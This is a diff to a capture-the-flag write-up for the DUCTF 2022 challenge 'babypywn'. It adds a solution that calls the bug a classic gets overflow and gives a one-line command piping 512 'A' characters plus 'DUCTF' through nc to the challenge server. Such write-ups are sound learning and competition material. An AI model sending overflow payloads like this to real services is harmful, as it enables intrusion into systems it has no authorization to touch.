@@ -8,7 +8,10 @@ Python is memory safe, right? [babypywn.py](./babypywn.py ":ignore")
 
 #### Solution:
 
+Classic `gets` overflow:
+
 ```bash
+python -c 'import pwn;  print("A"*512 + "DUCTF")' | nc 2022.ductf.dev 30021
 ```
 
 ---
